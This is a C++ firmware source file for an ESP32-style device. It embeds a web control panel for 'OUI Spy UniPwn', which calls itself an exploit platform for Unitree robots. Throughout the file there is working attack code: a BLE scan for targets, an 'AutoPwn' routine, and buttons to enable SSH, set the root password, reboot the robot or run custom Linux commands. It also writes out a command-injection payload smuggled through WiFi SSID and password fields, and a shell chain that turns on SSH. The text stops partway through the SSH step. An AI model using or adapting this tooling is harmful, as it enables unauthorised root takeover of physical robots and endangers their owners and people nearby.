/*
 * OUI Spy UniPwn Web Interface - Real BLE Functionality
 * Authentic OUI Spy styling with baby blue to pink gradient
 */

#include "config.h"

#if ENABLE_WEB_INTERFACE

#include <WebServer.h>
#include <DNSServer.h>
#include <ArduinoJson.h>

// Forward declarations
struct UnitreeDevice; // Forward declaration

extern std::vector<UnitreeDevice> discoveredDevices;
extern bool executeCommand(const UnitreeDevice& device, const String& command);
extern void scanForDevices();
extern bool buzzerEnabled;
extern bool ledEnabled;
extern void saveConfiguration();

// Hardware feedback function declarations
#if ENABLE_BUZZER
extern void singleBeep();
extern void stopProximityBeep();
#endif

#if ENABLE_LED_FEEDBACK
extern void ledBlink(int duration);
extern void stopProximityLED();
#endif

WebServer webServer(WEB_SERVER_PORT);
DNSServer dnsServer;

String getASCIIArt() {
    return String(R"(
                           @@@@@@@@                                                         @@@@@@@@                                        
                       @@@ @@@@@@@@@@                                                    @@@@@@@@@@ @@@@                                    
                               @@@@ @ @ @@@@@@@@@@@@@                                               @@@@@@@@@@@@ @@@@@@@@                                
                     @@@@ @@@@@@@@@@@@@@@@@@@@@@@@                                          @@@@@@@@@@@@@@@@@@@ @@@@@@@@@                           
                 @@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                    @@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@                       
            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                                        @@@@@@ @@@@@@@@@          @@@@@@@@@@@@                                @@@@@@@@@@@@@          @@@@@@@@@@@@@@@                       
           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                                   @@@@@@@@@ @@@               @@@@@@@@@@@@@                          @@@@@@@@@@@@@               @@@@@@@@@@@@@                       
          @@@ @@@@@@@@@@@@@       @@@@@@@@@@@@@@                                                  @@ @@@@@@@@@                  @@@@@@@@@@@@@@                     @@@@@@@@ @@@@                   @@@@@  @@@@                       
          @@@@ @@@@@@@@@              @@@@@@@@@@@@                                                  @@@@   @@@@                   @@@@@@@@@@@ @@                     @ @@@@@@@@@@@                    @@@@  @ @@                       
          @@@@@@@ @@@                   @@@@@@@@@@@@@                                                   @@@  @@@@                     @@ @@@@@@@@@@                     @@@@@@@@@ @@@                     @@@  @@ @                       
          @@@@@  @ @@                   @@@@@@@@@@@@@@@@@@@@@@@@@@@@                   @@@  @@@@                     @@@  @@ @                              @ @@@@@                      @@@@ @@@@                       
           @@@   @@@                     @@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                    @@@@ @@@@                    @@@@  @@@@                              @@@@@@@@                    @@@@@@@@@@                       
           @@@@ @@@@                     @@ @@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   @@@                     @@@@ @@@@@                   @@@   @ @                                 @ @@@@@                  @@@@@@@@@@                        
           @@@@ @@@@                     @@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  @@@                     @@@@@@@ @@@                @@@@@   @ @                                 @ @ @@@@                @@@@@@@@@ @                        
           @@@@ @@@@@                   @@@ @ @                                @@@@  @@@@                   @@@@@@@@@@@@             @@@@@    @@@@                               @@@@  @@@@@            @@@@@@@  @  @                        
           @@@@ @@@@                   @@@@@@@                                  @@@@  @@@@                   @@@@@@@@@@@@             @@@@@    @@@@                               @@@@  @@@@@            @@@@@@@  @  @                        
)");
}

const char* webPageHTML = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <title>OUI Spy - UniPwn Edition</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0; 
            padding: 20px;
            background: #0f0f23;
            color: #ffffff;
            position: relative;
            overflow-x: hidden;
        }
        .ascii-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.6;
            color: #ff0000;  /* Bright red ASCII art text */
            font-family: 'Courier New', monospace;
            font-size: 8px;
            line-height: 8px;
            white-space: pre;
            pointer-events: none;
            overflow: hidden;
        }
        .container {
            max-width: 800px; 
            margin: 0 auto; 
            background: rgba(255, 255, 255, 0.02);
            padding: 40px; 
            border-radius: 16px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2); 
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255, 255, 255, 0.05);
            position: relative;
            z-index: 1;
        }
        h1 {
            text-align: center;
            margin-bottom: 20px;
            margin-top: 0px;
            font-size: 42px;
            font-weight: 700;
            color: #8a2be2;
            background: -webkit-linear-gradient(45deg, #8a2be2, #4169e1);
            background: -moz-linear-gradient(45deg, #8a2be2, #4169e1);
            background: linear-gradient(45deg, #8a2be2, #4169e1);
            -webkit-background-clip: text;
            -moz-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
            -moz-text-fill-color: transparent;
            letter-spacing: 3px;
        }
        .section { 
            margin-bottom: 25px; 
            padding: 20px; 
            border: 1px solid rgba(255, 255, 255, 0.1); 
            border-radius: 12px; 
            background: rgba(255, 255, 255, 0.01); 
            backdrop-filter: blur(3px);
            text-align: center;
        }
        .section h3 { 
            margin-top: 0; 
            color: #ffffff; 
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 15px;
        }
        button { 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            color: #ffffff; 
            padding: 12px 24px; 
            border: none; 
            border-radius: 8px; 
            cursor: pointer; 
            font-size: 14px; 
            font-weight: 500;
            margin: 8px 4px; 
            transition: all 0.3s;
            display: inline-block;
        }
        button:hover { 
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
        }
        button.danger {
            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
        }
        input, select, textarea { 
            width: 100%; 
            padding: 12px; 
            border: 1px solid rgba(255, 255, 255, 0.2); 
            border-radius: 8px; 
            background: rgba(255, 255, 255, 0.02);
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            font-size: 14px;
            margin: 5px 0;
            text-align: left;
        }
        .status { 
            padding: 15px; 
            border-radius: 8px; 
            margin-bottom: 20px; 
            border-left: 4px solid #ff1493;
            background: rgba(255, 20, 147, 0.05);
            color: #ffffff;
            border: 1px solid rgba(255, 20, 147, 0.2);
        }
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }
        #logOutput {
            min-height: 300px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            background: rgba(0, 0, 0, 0.3);
            color: #00ff00;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
            gap: 15px;
            margin: 15px 0;
        }
        .stat-item {
            text-align: center;
            padding: 12px;
            background: rgba(138, 43, 226, 0.1);
            border-radius: 8px;
            border: 1px solid rgba(138, 43, 226, 0.3);
        }
        .stat-value {
            font-size: 24px;
            font-weight: bold;
            color: #8a2be2;
        }
        .stat-label {
            font-size: 12px;
            color: #cccccc;
            margin-top: 5px;
        }
        .scan-dots {
            color: #00ff00;
            font-weight: bold;
        }
        input[type="checkbox"] {
            width: auto;
            margin-right: 8px;
        }
        label {
            display: flex;
            align-items: center;
            justify-content: center;
        }
        @media (max-width: 768px) {
            .grid { grid-template-columns: 1fr; }
            h1 { font-size: 32px; }
            .container { padding: 20px; margin: 10px; }
        }
    </style>
</head>
<body>
    <div class="ascii-background"></div>
    <div class="container">
        <h1>OUI SPY - UNIPWN</h1>
        
        <div class="status">
            Unitree Robot BLE Exploit Platform - Based on github.com/Bin4ry/UniPwn - Command Injection via WiFi Config
        </div>
        
        <div class="grid">
            <div class="section">
                <h3>Target Discovery</h3>
                <div style="margin-bottom: 15px;">
                    <button onclick="toggleScan()" id="scanButton">Start BLE Scan</button>
                    <button onclick="clearTargets()">Clear Targets</button>
                </div>
                <div style="margin-bottom: 15px;">
                    <label style="color: #ffffff;">
                        <input type="checkbox" id="continuousMode" onchange="toggleContinuous()"> Continuous Scanning
                    </label>
                </div>
                <div id="scanStatus" style="margin: 10px 0; min-height: 20px;">
                    <div id="scanIndicator" style="display: none; color: #00ff00;">
                        Scanning for Unitree robots<span id="scanDots">.</span>
                    </div>
                </div>
                <div class="stats-grid">
                    <div class="stat-item">
                        <div class="stat-value" id="targetsFound">0</div>
                        <div class="stat-label">Targets Found</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="scanDuration">0s</div>
                        <div class="stat-label">Scan Duration</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="totalScans">0</div>
                        <div class="stat-label">Total Scans</div>
                    </div>
                </div>
                <textarea id="deviceList" readonly placeholder="Discovered Unitree robots will appear here..."></textarea>
            </div>
            
            <div class="section">
                <h3>Hardware Settings</h3>
                <div class="toggle-container" style="display: flex; flex-direction: column; gap: 15px;">
                    <div class="toggle-item">
                        <label style="color: #ffffff; display: flex; align-items: center; gap: 10px;">
                            <input type="checkbox" id="buzzerEnabled" name="buzzerEnabled" onchange="toggleBuzzer()" )html" + String(buzzerEnabled ? "checked" : "") + R"html(>
                            <span>Enable Buzzer</span>
                        </label>
                        <div style="color: #cccccc; font-size: 12px; margin-top: 5px;">Audio feedback for boot and bot detection</div>
                    </div>
                    <div class="toggle-item">
                        <label style="color: #ffffff; display: flex; align-items: center; gap: 10px;">
                            <input type="checkbox" id="ledEnabled" name="ledEnabled" onchange="toggleLED()" )html" + String(ledEnabled ? "checked" : "") + R"html(>
                            <span>Enable LED</span>
                        </label>
                        <div style="color: #cccccc; font-size: 12px; margin-top: 5px;">Orange LED blinks with buzzer feedback</div>
                    </div>
                </div>
            </div>
            
            <div class="section">
                <h3>Attack Vectors</h3>
                <div id="selectedTarget" style="margin-bottom: 15px; color: #8a2be2;">No target selected</div>
                
                <div style="margin-bottom: 25px; padding: 15px; border: 2px solid #ff6b6b; border-radius: 8px; background: rgba(255, 107, 107, 0.1);">
                    <h4 style="color: #ff6b6b; margin-bottom: 10px;">AutoPwn - Complete Exploitation</h4>
                    <button onclick="startAutoPwn()" id="autoPwnButton" style="background: linear-gradient(45deg, #ff6b6b, #ff8e8e); font-weight: bold; font-size: 16px; padding: 12px 20px;">
                        START AUTOPWN
                    </button>
                    <div id="autoPwnStatus" style="margin-top: 10px; min-height: 20px;"></div>
                    <div id="autoPwnProgress" style="display: none; margin-top: 10px;">
                        <div style="background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden;">
                            <div id="progressBar" style="height: 20px; background: linear-gradient(90deg, #32ff32, #ff69b4); width: 0%; transition: width 0.5s;"></div>
                        </div>
                        <div id="progressText" style="text-align: center; margin-top: 5px; color: #ffffff;">0% - Initializing...</div>
                    </div>
                </div>
                
                <div style="border-top: 1px solid rgba(255,255,255,0.1); padding-top: 15px;">
                    <h4 style="color: #cccccc; margin-bottom: 10px;">Manual Attacks</h4>
                    <button onclick="quickExploit('enable_ssh')">Enable SSH</button>
                    <button onclick="quickExploit('change_root_pwd')">Set Root Password</button>
                    <button onclick="quickExploit('reboot')" class="danger">Reboot Target</button>
                    
                    <h4 style="color: #ffffff; font-size: 14px; margin: 20px 0 10px 0;">Custom Command</h4>
                    <input type="text" id="customCommand" placeholder="Enter custom Linux command...">
                    <select id="injectionMethod">
                        <option value="ssid">Inject via SSID</option>
                        <option value="password">Inject via WiFi Password</option>
                    </select>
                    <button onclick="customExploit()">Execute Custom</button>
                </div>
                
                <div class="stats-grid">
                    <div class="stat-item">
                        <div class="stat-value" id="successfulExploits">0</div>
                        <div class="stat-label">Successful</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="failedExploits">0</div>
                        <div class="stat-label">Failed</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="autoPwnCount">0</div>
                        <div class="stat-label">AutoPwn Runs</div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="section">
            <h3>System Monitor</h3>
            <div class="stats-grid">
                <div class="stat-item">
                    <div class="stat-value" id="freeHeap">--</div>
                    <div class="stat-label">Free Heap (KB)</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="uptime">--</div>
                    <div class="stat-label">Uptime</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="wifiStatus">--</div>
                    <div class="stat-label">WiFi Status</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="bleStatus">--</div>
                    <div class="stat-label">BLE Status</div>
                </div>
            </div>
            <button onclick="getSystemInfo()">Refresh System Info</button>
        </div>
        
        <div class="section">
            <h3>Operations Log</h3>
            <textarea id="logOutput" readonly placeholder="OUI Spy UniPwn operations will be logged here..."></textarea>
            <div style="text-align: center; margin-top: 15px;">
                <button onclick="clearLog()">Clear Log</button>
                <button onclick="exportLog()">Export Log</button>
            </div>
        </div>
    </div>

    <script>
        let selectedDevice = null;
        let exploitStats = { successful: 0, failed: 0 };
        let isScanning = false;
        let continuousScanning = false;
        let scanCount = 0;
        let scanInterval;
        let autoPwnRunning = false;
        let autoPwnCount = 0;

        function addLog(message, type = 'info') {
            const logOutput = document.getElementById('logOutput');
            const timestamp = new Date().toLocaleTimeString();
            let prefix = '[i]';
            
            if (type === 'success') prefix = '[+]';
            else if (type === 'error') prefix = '[-]';
            else if (type === 'scan') prefix = '[*]';
            else if (type === 'exploit') prefix = '[>]';
            
            logOutput.value += timestamp + ' ' + prefix + ' ' + message + '\\n';
            logOutput.scrollTop = logOutput.scrollHeight;
        }

        function clearLog() {
            document.getElementById('logOutput').value = '';
            addLog('Operations log cleared', 'info');
        }

        function exportLog() {
            const logContent = document.getElementById('logOutput').value;
            const blob = new Blob([logContent], { type: 'text/plain' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            const timestamp = new Date().toISOString().slice(0,19).replace(/:/g, '-');
            a.download = 'ouispy-unipwn-log-' + timestamp + '.txt';
            a.click();
            window.URL.revokeObjectURL(url);
        }

        function clearTargets() {
            document.getElementById('deviceList').value = '';
            document.getElementById('targetsFound').textContent = '0';
            selectedDevice = null;
            document.getElementById('selectedTarget').textContent = 'No target selected';
            addLog('Target list cleared', 'info');
        }

        function scanDevices() {
            const scanStatus = document.getElementById('scanStatus');
            scanStatus.textContent = 'Scanning for Unitree robots...';
            
            addLog('Starting BLE scan for Unitree robots', 'scan');
            
            fetch('/scan', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    displayDevices(data.devices || []);
                    scanStatus.textContent = 'Scan complete - ' + (data.devices ? data.devices.length : 0) + ' devices found';
                    addLog('BLE scan completed - found ' + (data.devices ? data.devices.length : 0) + ' Unitree robots', 'success');
                })
                .catch(error => {
                    scanStatus.textContent = 'Scan failed';
                    addLog('BLE scan failed: ' + error.message, 'error');
                });
        }

        function displayDevices(devices) {
            const deviceList = document.getElementById('deviceList');
            const targetsFound = document.getElementById('targetsFound');
            
            if (devices.length === 0) {
                deviceList.value = 'No Unitree robots detected.\\n\\nEnsure targets are:\\n- Powered on and active\\n- Within BLE range (10-30m)\\n- Not in sleep mode\\n\\nSupported models: Go2, G1, H1, B2';
                targetsFound.textContent = '0';
                addLog('Scan completed - no targets found', 'info');
                return;
            }
            
            let output = 'DISCOVERED UNITREE ROBOTS (' + devices.length + '):\\n';
            output += '='.repeat(40) + '\\n\\n';
            
            devices.forEach((device, index) => {
                const rssi = device.rssi ? device.rssi + 'dBm' : 'N/A';
                const model = device.name ? device.name.replace('Unitree_', '') : 'Unknown';
                const signalStrength = device.rssi > -60 ? 'Excellent' : device.rssi > -70 ? 'Good' : device.rssi > -80 ? 'Fair' : 'Weak';
                
                output += 'TARGET #' + (index + 1) + '\\n';
                output += 'Address: ' + device.address + '\\n';
                output += 'Model: ' + model + '\\n';
                output += 'Signal: ' + rssi + ' (' + signalStrength + ')\\n';
                output += 'Status: Ready for exploitation\\n';
                output += '-'.repeat(30) + '\\n\\n';
            });
            
            output += 'Click a target above to select for AutoPwn';
            
            deviceList.value = output;
            targetsFound.textContent = devices.length;
            
            // Store devices for selection and create clickable interface
            window.discoveredDevices = devices;
            
            // Add click handlers for device selection
            deviceList.onclick = function(e) {
                // Simple device selection by parsing the clicked area
                const lines = this.value.split('\\n');
                const clickPos = this.selectionStart;
                let charCount = 0;
                let selectedIndex = -1;
                
                for (let i = 0; i < lines.length; i++) {
                    if (charCount <= clickPos && clickPos <= charCount + lines[i].length) {
                        if (lines[i].startsWith('TARGET #')) {
                            selectedIndex = parseInt(lines[i].replace('TARGET #', '')) - 1;
                            break;
                        }
                    }
                    charCount += lines[i].length + 1; // +1 for newline
                }
                
                if (selectedIndex >= 0 && selectedIndex < devices.length) {
                    selectDevice(selectedIndex, devices[selectedIndex].address, devices[selectedIndex].name);
                }
            };
        }

        function selectDevice(index, address, name) {
            selectedDevice = { index, address, name };
            const model = name ? name.replace('Unitree_', '') : 'Unknown';
            document.getElementById('selectedTarget').innerHTML = '<span style="color: #32ff32;">SELECTED TARGET: ' + model + ' (' + address + ')</span>';
            addLog('=== TARGET SELECTED ===', 'success');
            addLog('Model: ' + model, 'info');
            addLog('Address: ' + address, 'info');
            addLog('Ready for AutoPwn exploitation', 'success');
        }
        
        function toggleScan() {
            if (isScanning) {
                // Immediate stop - don't wait for any async operations
                isScanning = false;
                document.getElementById('scanButton').textContent = 'Start BLE Scan';
                document.getElementById('scanIndicator').style.display = 'none';
                document.getElementById('deviceList').value = 'Scanning stopped by user';
                addLog('BLE scanning stopped by user', 'info');
                
                // Clean up any intervals/timeouts
                if (scanInterval) {
                    clearTimeout(scanInterval);
                    scanInterval = null;
                }
            } else {
                startScan();
            }
        }
        
        function startScan() {
            isScanning = true;
            scanCount++;
            document.getElementById('scanButton').textContent = 'Stop Scanning';
            document.getElementById('scanIndicator').style.display = 'block';
            document.getElementById('totalScans').textContent = scanCount;
            
            // Clear previous results
            document.getElementById('deviceList').value = 'Initializing BLE scan...';
            document.getElementById('targetsFound').textContent = '0';
            
            addLog('=== BLE SCAN #' + scanCount + ' INITIATED ===', 'scan');
            addLog('Scanning for Unitree Go2, G1, H1, B2 robots...', 'info');
            
            let scanStartTime = Date.now();
            let dotCount = 1;
            const updateTimer = setInterval(() => {
                if (!isScanning) {
                    clearInterval(updateTimer);
                    return;
                }
                const elapsed = Math.floor((Date.now() - scanStartTime) / 1000);
                document.getElementById('scanDuration').textContent = elapsed + 's';
                
                // Animate scanning dots (1, 2, 3, then back to 1)
                dotCount = (dotCount % 3) + 1;
                const dots = '.'.repeat(dotCount);
                document.getElementById('scanDots').textContent = dots;
                document.getElementById('deviceList').value = 'Scanning BLE devices' + dots + '\\nElapsed: ' + elapsed + 's\\nSearching for Unitree robots' + dots;
            }, 500);
            
            // Add scan progress logging
            addLog('BLE scan in progress - searching frequency bands...', 'info');
            
            fetch('/scan', { method: 'POST' })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Scan request failed: HTTP ' + response.status);
                    }
                    return response.json();
                })
                .then(data => {
                    clearInterval(updateTimer);
                    const foundCount = data.devices ? data.devices.length : 0;
                    
                    // Update scan status
                    document.getElementById('scanIndicator').style.display = 'none';
                    const finalDuration = Math.floor((Date.now() - scanStartTime) / 1000);
                    document.getElementById('scanDuration').textContent = finalDuration + 's';
                    
                    // Log detailed results
                    addLog('BLE scan #' + scanCount + ' completed in ' + finalDuration + 's', 'success');
                    addLog('Discovered ' + foundCount + ' Unitree robot(s)', foundCount > 0 ? 'success' : 'info');
                    
                    if (foundCount > 0) {
                        data.devices.forEach((device, index) => {
                            const model = device.name ? device.name.replace('Unitree_', '') : 'Unknown';
                            addLog('Target ' + (index + 1) + ': ' + device.address + ' (' + model + ') RSSI: ' + device.rssi + 'dBm', 'info');
                        });
                    } else {
                        addLog('No Unitree robots in range - ensure targets are powered on', 'info');
                    }
                    
                    displayDevices(data.devices || []);
                    
                    if (continuousScanning && isScanning) {
                        addLog('Continuous mode: Next scan in 5 seconds...', 'info');
                        scanInterval = setTimeout(() => {
                            if (continuousScanning && isScanning) {
                                startScan();
                            }
                        }, 5000);
                    } else {
                        stopScanning();
                    }
                })
                .catch(error => {
                    clearInterval(updateTimer);
                    document.getElementById('scanIndicator').style.display = 'none';
                    document.getElementById('deviceList').value = 'Scan failed: ' + error.message;
                    
                    addLog('BLE scan #' + scanCount + ' FAILED: ' + error.message, 'error');
                    addLog('Check device status and retry scanning', 'error');
                    
                    if (!continuousScanning) {
                        stopScanning();
                    } else {
                        addLog('Continuous mode: Retrying in 10 seconds...', 'info');
                        scanInterval = setTimeout(() => {
                            if (continuousScanning && isScanning) {
                                startScan();
                            }
                        }, 10000);
                    }
                });
        }

        function quickExploit(command) {
            if (!selectedDevice) {
                alert('Please select a target device first');
                addLog('Exploit attempt failed - no target selected', 'error');
                return;
            }
            
            addLog('Executing ' + command + ' on ' + selectedDevice.address, 'exploit');
            
            fetch('/exploit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    target: selectedDevice.address,
                    command: command,
                    method: 'ssid'
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    exploitStats.successful++;
                    document.getElementById('successfulExploits').textContent = exploitStats.successful;
                    addLog(command + ' executed successfully on ' + selectedDevice.address, 'success');
                } else {
                    exploitStats.failed++;
                    document.getElementById('failedExploits').textContent = exploitStats.failed;
                    addLog(command + ' failed on ' + selectedDevice.address + ': ' + data.error, 'error');
                }
            })
            .catch(error => {
                exploitStats.failed++;
                document.getElementById('failedExploits').textContent = exploitStats.failed;
                addLog('Exploit communication error: ' + error.message, 'error');
            });
        }

        function customExploit() {
            const command = document.getElementById('customCommand').value.trim();
            const method = document.getElementById('injectionMethod').value;
            
            if (!command) {
                alert('Please enter a custom command');
                return;
            }
            
            if (!selectedDevice) {
                alert('Please select a target device first');
                return;
            }
            
            addLog('Executing custom command "' + command + '" via ' + method + ' injection', 'exploit');
            
            fetch('/exploit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    target: selectedDevice.address,
                    command: command,
                    method: method
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    exploitStats.successful++;
                    document.getElementById('successfulExploits').textContent = exploitStats.successful;
                    addLog('Custom command executed successfully', 'success');
                } else {
                    exploitStats.failed++;
                    document.getElementById('failedExploits').textContent = exploitStats.failed;
                    addLog('Custom command failed: ' + data.error, 'error');
                }
            })
            .catch(error => {
                exploitStats.failed++;
                document.getElementById('failedExploits').textContent = exploitStats.failed;
                addLog('Custom exploit error: ' + error.message, 'error');
            });
        }

        function getSystemInfo() {
            fetch('/status')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('freeHeap').textContent = Math.floor(data.freeHeap / 1024);
                    document.getElementById('uptime').textContent = data.uptime;
                    document.getElementById('wifiStatus').textContent = data.wifiStatus;
                    document.getElementById('bleStatus').textContent = data.bleStatus;
                })
                .catch(error => {
                    addLog('Failed to get system info: ' + error.message, 'error');
                });
        }

        async function startAutoPwn() {
            if (autoPwnRunning) {
                addLog('AutoPwn already running!', 'error');
                return;
            }
            
            if (!selectedDevice) {
                addLog('AUTOPWN FAILED: No target selected!', 'error');
                document.getElementById('autoPwnStatus').innerHTML = '<span style="color: #ff6b6b;">ERROR: Select a target first</span>';
                return;
            }
            
            // Bulletproof confirmation dialog
            if (!confirm('AUTOPWN WARNING: This will attempt full exploitation of ' + selectedDevice.name + ' (' + selectedDevice.address + ')\\n\\nThis will:\\n- Connect via BLE\\n- Inject WiFi credentials\\n- Enable SSH access\\n- Change root password\\n- Extract system info\\n\\nProceed with AutoPwn?')) {
                addLog('AutoPwn cancelled by user', 'info');
                return;
            }
            
            autoPwnRunning = true;
            autoPwnCount++;
            document.getElementById('autoPwnCount').textContent = autoPwnCount;
            document.getElementById('autoPwnButton').textContent = 'AUTOPWN RUNNING...';
            document.getElementById('autoPwnButton').style.background = 'linear-gradient(45deg, #666666, #888888)';
            document.getElementById('autoPwnProgress').style.display = 'block';
            
            addLog('=== AUTOPWN #' + autoPwnCount + ' INITIATED ===', 'scan');
            addLog('Target: ' + selectedDevice.name + ' (' + selectedDevice.address + ')', 'info');
            
            const steps = [
                { name: 'System Check', progress: 10 },
                { name: 'BLE Connection', progress: 25 },
                { name: 'Handshake', progress: 40 },
                { name: 'WiFi Injection', progress: 55 },
                { name: 'SSH Enable', progress: 70 },
                { name: 'Root Access', progress: 85 },
                { name: 'System Extract', progress: 100 }
            ];
            
            try {
                for (let i = 0; i < steps.length; i++) {
                    const step = steps[i];
                    updateProgress(step.progress, step.name);
                    addLog('AutoPwn Step ' + (i+1) + '/7: ' + step.name, 'info');
                    
                    // Execute the actual step
                    const success = await executeAutoPwnStep(i, step.name);
                    
                    if (!success) {
                        throw new Error('Step failed: ' + step.name);
                    }
                    
                    // Wait between steps for stability
                    await sleep(1500);
                }
                
                // Success
                updateProgress(100, 'AUTOPWN COMPLETE');
                document.getElementById('autoPwnStatus').innerHTML = '<span style="color: #32ff32;">AUTOPWN SUCCESS: Full exploitation completed!</span>';
                addLog('=== AUTOPWN #' + autoPwnCount + ' COMPLETED SUCCESSFULLY ===', 'success');
                exploitStats.successful++;
                document.getElementById('successfulExploits').textContent = exploitStats.successful;
                
            } catch (error) {
                updateProgress(0, 'AUTOPWN FAILED');
                document.getElementById('autoPwnStatus').innerHTML = '<span style="color: #ff6b6b;">AUTOPWN FAILED: ' + error.message + '</span>';
                addLog('=== AUTOPWN #' + autoPwnCount + ' FAILED ===', 'error');
                addLog('Error: ' + error.message, 'error');
                exploitStats.failed++;
                document.getElementById('failedExploits').textContent = exploitStats.failed;
            }
            
            // Reset UI
            autoPwnRunning = false;
            document.getElementById('autoPwnButton').textContent = 'START AUTOPWN';
            document.getElementById('autoPwnButton').style.background = 'linear-gradient(45deg, #ff6b6b, #ff8e8e)';
            setTimeout(() => {
                document.getElementById('autoPwnProgress').style.display = 'none';
            }, 5000);
        }
        
        async function executeAutoPwnStep(stepIndex, stepName) {
            const maxRetries = 3;
            const timeout = 10000; // 10 second timeout
            
            for (let attempt = 1; attempt <= maxRetries; attempt++) {
                try {
                    if (attempt > 1) {
                        addLog('Retry attempt ' + attempt + '/' + maxRetries + ' for: ' + stepName, 'info');
                        await sleep(2000); // Wait before retry
                    }
                    
                    switch(stepIndex) {
                        case 0: // System Check
                            addLog('Checking system health and BLE status...', 'info');
                            const statusResponse = await fetchWithTimeout('/status', timeout);
                            if (!statusResponse.ok) {
                                throw new Error('HTTP ' + statusResponse.status + ': System status check failed');
                            }
                            const statusData = await statusResponse.json();
                            
                            // Comprehensive system checks
                            if (!statusData.bleEnabled) throw new Error('BLE is not enabled on device');
                            if (statusData.freeHeap < 50000) throw new Error('Low memory: ' + statusData.freeHeap + ' bytes');
                            if (!statusData.wifiConnected && statusData.wifiStatus !== 'AP Mode') {
                                throw new Error('WiFi not in AP mode');
                            }
                            
                            addLog('System check PASSED - BLE: active, Heap: ' + Math.floor(statusData.freeHeap/1024) + 'KB, WiFi: ' + (statusData.wifiConnected ? 'Connected' : 'AP Mode'), 'success');
                            return true;
                            
                        case 1: // BLE Connection Test
                            addLog('Testing BLE connection to ' + selectedDevice.address + '...', 'info');
                            
                            // Verify device is still in discovered list
                            const devicesResponse = await fetchWithTimeout('/devices', timeout);
                            if (!devicesResponse.ok) throw new Error('Failed to get device list');
                            const devicesData = await devicesResponse.json();
                            
                            const deviceFound = devicesData.devices.find(d => d.address === selectedDevice.address);
                            if (!deviceFound) throw new Error('Target device no longer discoverable');
                            
                            addLog('BLE connection test PASSED - Device still discoverable with RSSI: ' + deviceFound.rssi, 'success');
                            return true;
                            
                        case 2: // Handshake
                            addLog('Initiating BLE handshake protocol...', 'info');
                            const handshakeResponse = await fetchWithTimeout('/exploit', timeout, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    address: selectedDevice.address,
                                    command: 'echo "handshake_$(date +%s)"',
                                    method: 'ssid'
                                })
                            });
                            
                            if (!handshakeResponse.ok) {
                                const errorText = await handshakeResponse.text();
                                throw new Error('Handshake failed: HTTP ' + handshakeResponse.status + ' - ' + errorText);
                            }
                            
                            const handshakeResult = await handshakeResponse.json();
                            if (!handshakeResult.success) {
                                throw new Error('Handshake rejected by target: ' + (handshakeResult.error || 'Unknown error'));
                            }
                            
                            addLog('BLE handshake COMPLETED - Protocol established successfully', 'success');
                            return true;
                            
                        case 3: // WiFi Injection
                            addLog('Injecting malicious WiFi configuration...', 'info');
                            const wifiPayload = '\\";echo \\"PWNED_$(whoami)_$(date +%s)\\" > /tmp/unipwn.log;#';
                            
                            const wifiResponse = await fetchWithTimeout('/exploit', timeout, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    address: selectedDevice.address,
                                    command: wifiPayload,
                                    method: 'ssid'
                                })
                            });
                            
                            if (!wifiResponse.ok) {
                                const errorText = await wifiResponse.text();
                                throw new Error('WiFi injection failed: HTTP ' + wifiResponse.status + ' - ' + errorText);
                            }
                            
                            const wifiResult = await wifiResponse.json();
                            if (!wifiResult.success) {
                                throw new Error('WiFi injection rejected: ' + (wifiResult.error || 'Command injection blocked'));
                            }
                            
                            addLog('WiFi injection SUCCESSFUL - Command payload delivered', 'success');
                            return true;
                            
                        case 4: // SSH Enable
                            addLog('Enabling SSH daemon on target...', 'info');
                            const sshCommand = 'systemctl enable ssh && systemctl start ssh && echo "SSH_ENABLED_$(date +%s)" >> /tmp/unipwn.log';
                            
                            const sshResponse = await fetchWithTimeout('/exploit', timeout, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    address: selectedDevice.address,
                                    command: sshCommand,
